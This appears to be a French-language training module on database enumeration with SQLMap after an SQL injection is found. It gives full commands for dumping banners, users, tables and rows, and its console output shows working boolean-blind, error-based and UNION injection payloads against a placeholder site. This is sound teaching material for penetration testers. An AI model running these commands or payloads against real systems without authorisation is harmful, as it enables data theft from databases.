Énumération de base de données
==============================

* * * * *

L'énumération représente la partie centrale d'une attaque par injection SQL, qui est effectuée juste après la détection réussie et la confirmation de l'exploitabilité de la vulnérabilité SQLi ciblée. Elle consiste en la recherche et la récupération (c'est-à-dire l'exfiltration) de toutes les informations disponibles dans la base de données vulnérable.

* * * * *

Exfiltration de données SQLMap
------------------------------

À cette fin, SQLMap dispose d'un ensemble prédéfini de requêtes pour tous les SGBD pris en charge, où chaque entrée représente le SQL qui doit être exécuté sur la cible pour récupérer le contenu souhaité. Par exemple, les extraits du fichier [queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) pour un SGBD MySQL peuvent être consultés ci-dessous :

Code : XML

```
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...

```

Par exemple, si un utilisateur souhaite récupérer la « bannière » (switch `--banner`) de la cible basée sur le SGBD MySQL, la `VERSION()`requête sera utilisée à cette fin.\
En cas de récupération du nom d'utilisateur actuel (switch `--current-user`), la `CURRENT_USER()`requête sera utilisée.

Un autre exemple consiste à récupérer tous les noms d'utilisateur (c'est-à-dire tag `<users>`). Deux requêtes sont utilisées, selon la situation. La requête marquée comme `inband`est utilisée dans toutes les situations non aveugles (c'est-à-dire requête UNION et SQLi basé sur les erreurs), où les résultats de la requête peuvent être attendus dans la réponse elle-même. La requête marquée par `blind`, en revanche, est utilisée pour toutes les situations aveugles, dans lesquelles les données doivent être récupérées ligne par ligne, colonne par colonne et bit par bit.

* * * * *

Énumération de base des données de base de données
--------------------------------------------------

Habituellement, après une détection réussie d'une vulnérabilité SQLi, nous pouvons commencer l'énumération des détails de base de la base de données, tels que le nom d'hôte de la cible vulnérable ( ), le nom de l'utilisateur actuel ( ), le nom actuel de la base de données ( ) `--hostname`ou `--current-user`les `--current-db`hachages de mot de passe ( ). `--passwords`). SQLMap ignorera la détection SQLi si elle a été identifiée précédemment et démarrera directement le processus d'énumération du SGBD.

L'énumération commence généralement par la récupération des informations de base :

-   Bannière de version de base de données (switch `--banner`)
-   Nom d'utilisateur actuel (commutateur `--current-user`)
-   Nom de la base de données actuelle (switch `--current-db`)
-   Vérifier si l'utilisateur actuel dispose des droits DBA (administrateur).

La commande SQLMap suivante effectue tout ce qui précède :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 13:30:57 /2020-09-17/

[13:30:57] [INFO] resuming back-end DBMS 'mysql'
[13:30:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5134=5134

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
---
[13:30:57] [INFO] the back-end DBMS is MySQL
[13:30:57] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 13:30:58 /2020-09-17/

```

À partir de l'exemple ci-dessus, nous pouvons voir que la version de la base de données est assez ancienne (MySQL 5.1.41 - de novembre 2009) et que le nom d'utilisateur actuel est `root`, alors que le nom actuel de la base de données est `testdb`.

Remarque : L'utilisateur « root » dans le contexte de la base de données n'a dans la grande majorité des cas aucune relation avec l'utilisateur du système d'exploitation « root », autre que celle représentant l'utilisateur privilégié dans le contexte du SGBD. Cela signifie essentiellement que l'utilisateur de la base de données ne doit avoir aucune contrainte dans le contexte de la base de données, tandis que les privilèges du système d'exploitation (par exemple, écriture du système de fichiers dans un emplacement arbitraire) doivent être minimalistes, du moins dans les déploiements récents. Le même principe s'applique pour le rôle générique « DBA ».

* * * * *

Énumération de table
--------------------

Dans les scénarios les plus courants, après avoir trouvé le nom de la base de données actuelle (c'est-à-dire `testdb`), la récupération des noms de table se ferait en utilisant l' `--tables`option et en spécifiant le nom de la base de données avec `-D testdb`, comme suit :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+

```

Après avoir repéré le nom de la table qui vous intéresse, la récupération de son contenu peut être effectuée en utilisant l' `--dump`option et en spécifiant le nom de la table avec `-T users`, comme suit :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

...SNIP...
Database: testdb

Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+

[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'

```

La sortie de la console montre que la table est sauvegardée au format CSV formaté dans un fichier local, `users.csv`.

Astuce : Outre le CSV par défaut, nous pouvons spécifier le format de sortie avec l'option `--dump-format` en HTML ou SQLite, afin de pouvoir ultérieurement étudier plus en détail la base de données dans un environnement SQLite.

![SQLite](https://academy.hackthebox.com/storage/modules/58/pVBXxRz.png)

* * * * *

Énumération de table/ligne
--------------------------

Lorsqu'il s'agit de grands tableaux comportant de nombreuses colonnes et/ou lignes, nous pouvons spécifier les colonnes (par exemple, uniquement `name`et `surname`colonnes) avec l' `-C`option suivante :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

...SNIP...
Database: testdb

Table: users
[4 entries]
+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+

```

Pour affiner les lignes en fonction de leur(s) numéro(s) ordinaux à l'intérieur du tableau, nous pouvons spécifier les lignes avec les options `--start`et `--stop`(par exemple, commencer de la 2e à la 3e entrée), comme suit :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

...SNIP...
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+

```

* * * * *

Énumération conditionnelle
--------------------------

S'il est nécessaire de récupérer certaines lignes en fonction d'une `WHERE`condition connue (par exemple `name LIKE 'f%'`), nous pouvons utiliser l'option `--where`, comme suit :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+

```

* * * * *

Énumération complète de la base de données
------------------------------------------

Au lieu de récupérer le contenu par table unique, nous pouvons récupérer toutes les tables de la base de données qui nous intéresse en ignorant `-T`complètement l'utilisation de l'option (par exemple `--dump -D testdb`). En utilisant simplement le commutateur `--dump`sans spécifier de table avec `-T`, tout le contenu actuel de la base de données sera récupéré. Quant au `--dump-all`switch, tout le contenu de toutes les bases de données sera récupéré.

Dans de tels cas, il est également conseillé à l'utilisateur d'inclure le commutateur `--exclude-sysdbs`(par exemple `--dump-all --exclude-sysdbs`), qui demandera à SQLMap d'ignorer la récupération du contenu des bases de données système, car cela présente généralement peu d'intérêt pour les pentesters.
